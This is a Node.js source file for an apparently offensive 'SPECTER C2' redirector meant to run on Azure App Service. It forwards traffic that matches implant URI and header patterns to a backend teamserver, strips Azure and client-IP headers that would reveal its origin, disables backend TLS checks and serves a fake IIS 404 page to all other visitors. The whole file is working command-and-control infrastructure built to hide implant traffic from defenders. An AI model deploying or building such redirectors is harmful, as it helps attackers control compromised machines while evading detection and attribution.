/**
 * SPECTER C2 Azure App Service Redirector — Zero-dependency HTTP Proxy
 *
 * Filters incoming traffic against C2 profile patterns (URI + header).
 * Matching requests are proxied to the backend teamserver with full
 * header preservation and Azure-header stripping. Non-matching requests
 * receive a decoy response to blend into normal web traffic.
 *
 * Uses ONLY Node.js built-in modules — no npm dependencies required.
 */

'use strict';

const http = require('http');
const https = require('https');
const { URL } = require('url');

// -- Configuration from environment -----------------------------------------

const PORT           = process.env.PORT || 8080;
const BACKEND_URL    = process.env.BACKEND_URL;
const URI_PATTERN    = process.env.URI_PATTERN || '^/api/v[0-9]+/';
const HEADER_NAME    = (process.env.HEADER_NAME || 'X-Request-ID').toLowerCase();
const HEADER_PATTERN = process.env.HEADER_PATTERN || '^[a-f0-9]{32}$';
const DECOY_BODY     = process.env.DECOY_RESPONSE ||
  '<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1>' +
  '<p>The requested URL was not found on this server.</p></body></html>';

if (!BACKEND_URL) {
  process.stderr.write('FATAL: BACKEND_URL environment variable is not set\n');
  process.exit(1);
}

const backend = new URL(BACKEND_URL);
const backendIsHttps = backend.protocol === 'https:';
const backendClient = backendIsHttps ? https : http;
const backendPort = backend.port || (backendIsHttps ? 443 : 80);

const uriRegex = new RegExp(URI_PATTERN);
const hdrRegex = new RegExp(HEADER_PATTERN);

// -- Headers to strip -------------------------------------------------------

const STRIP_REQUEST_HEADERS = new Set([
  'x-forwarded-for', 'x-forwarded-proto', 'x-forwarded-port',
  'x-original-url', 'x-waws-unencoded-url', 'x-arr-log-id',
  'x-arr-ssl', 'x-azure-clientip', 'x-azure-fdid', 'x-azure-ref',
  'x-azure-requestchain', 'x-azure-socketip', 'disguised-host',
  'x-site-deployment-id', 'was-default-hostname',
  'x-client-ip', 'x-client-port',
]);

const STRIP_RESPONSE_HEADERS = new Set([
  'x-powered-by', 'x-aspnet-version', 'x-azure-ref',
  'x-azure-requestchain', 'x-ms-request-id', 'server',
]);

// -- Traffic validation -----------------------------------------------------

function isImplantTraffic(req) {
  const url = req.url || '/';
  if (!uriRegex.test(url)) return false;
  const hdrValue = req.headers[HEADER_NAME];
  if (!hdrValue || !hdrRegex.test(hdrValue)) return false;
  return true;
}

// -- Decoy response ---------------------------------------------------------

function sendDecoy(res) {
  res.writeHead(404, {
    'Content-Type': 'text/html; charset=utf-8',
    'Content-Length': Buffer.byteLength(DECOY_BODY),
    'Server': 'Microsoft-IIS/10.0',
    'X-Powered-By': 'ASP.NET',
    'Cache-Control': 'no-store',
    'Connection': 'close',
  });
  res.end(DECOY_BODY);
}

// -- Clean headers ----------------------------------------------------------

function cleanRequestHeaders(incoming) {
  const cleaned = {};
  for (const [key, value] of Object.entries(incoming)) {
    if (!STRIP_REQUEST_HEADERS.has(key.toLowerCase())) {
      cleaned[key] = value;
    }
  }
  return cleaned;
}

function cleanResponseHeaders(incoming) {
  const cleaned = {};
  for (const [key, value] of Object.entries(incoming)) {
    if (!STRIP_RESPONSE_HEADERS.has(key.toLowerCase())) {
      cleaned[key] = value;
    }
  }
  return cleaned;
}

// -- Proxy logic ------------------------------------------------------------

function proxyRequest(clientReq, clientRes) {
  const options = {
    hostname: backend.hostname,
    port: backendPort,
    path: clientReq.url,
    method: clientReq.method,
    headers: cleanRequestHeaders(clientReq.headers),
    timeout: 300000,
  };

  // Don't verify TLS for self-signed backend certs
  if (backendIsHttps) {
    options.rejectUnauthorized = false;
  }

  const proxyReq = backendClient.request(options, (proxyRes) => {
    const headers = cleanResponseHeaders(proxyRes.headers);
    clientRes.writeHead(proxyRes.statusCode, headers);
    proxyRes.pipe(clientRes, { end: true });
  });

  proxyReq.on('error', (err) => {
    process.stderr.write(`proxy error: ${err.message}\n`);
    sendDecoy(clientRes);
  });

  proxyReq.on('timeout', () => {
    proxyReq.destroy();
    sendDecoy(clientRes);
  });

  clientReq.pipe(proxyReq, { end: true });
}

// -- HTTP server ------------------------------------------------------------

const server = http.createServer((req, res) => {
  if (!isImplantTraffic(req)) {
    sendDecoy(res);
    return;
  }
  proxyRequest(req, res);
});

// -- WebSocket upgrade handler ----------------------------------------------

server.on('upgrade', (clientReq, clientSocket, head) => {
  if (!isImplantTraffic(clientReq)) {
    clientSocket.write(
      'HTTP/1.1 404 Not Found\r\n' +
      'Server: Microsoft-IIS/10.0\r\n' +
      'Connection: close\r\n\r\n'
    );
    clientSocket.destroy();
    return;
  }

  // Proxy WebSocket upgrade to backend
  const options = {
    hostname: backend.hostname,
    port: backendPort,
    path: clientReq.url,
    method: 'GET',
    headers: {
      ...cleanRequestHeaders(clientReq.headers),
      'Connection': 'Upgrade',
      'Upgrade': 'websocket',
    },
  };

  if (backendIsHttps) {
    options.rejectUnauthorized = false;
  }

  const proxyReq = backendClient.request(options);

  proxyReq.on('upgrade', (proxyRes, proxySocket, proxyHead) => {
    // Forward the 101 Switching Protocols response
    let response = `HTTP/1.1 101 Switching Protocols\r\n`;
    const headers = cleanResponseHeaders(proxyRes.headers);
    for (const [key, value] of Object.entries(headers)) {
      response += `${key}: ${value}\r\n`;
    }
    response += '\r\n';
    clientSocket.write(response);

    if (proxyHead.length > 0) {
      clientSocket.write(proxyHead);
    }

    // Bidirectional pipe
    proxySocket.pipe(clientSocket);
    clientSocket.pipe(proxySocket);

    proxySocket.on('error', () => clientSocket.destroy());
    clientSocket.on('error', () => proxySocket.destroy());
  });

  proxyReq.on('error', (err) => {
    process.stderr.write(`ws proxy error: ${err.message}\n`);
    clientSocket.destroy();
  });

  proxyReq.end();
});

// -- Start ------------------------------------------------------------------

server.listen(PORT, () => {
  process.stderr.write(`redirector listening on :${PORT} -> ${BACKEND_URL}\n`);
});

// -- Graceful shutdown ------------------------------------------------------

process.on('SIGTERM', () => {
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(0), 10000).unref();
});
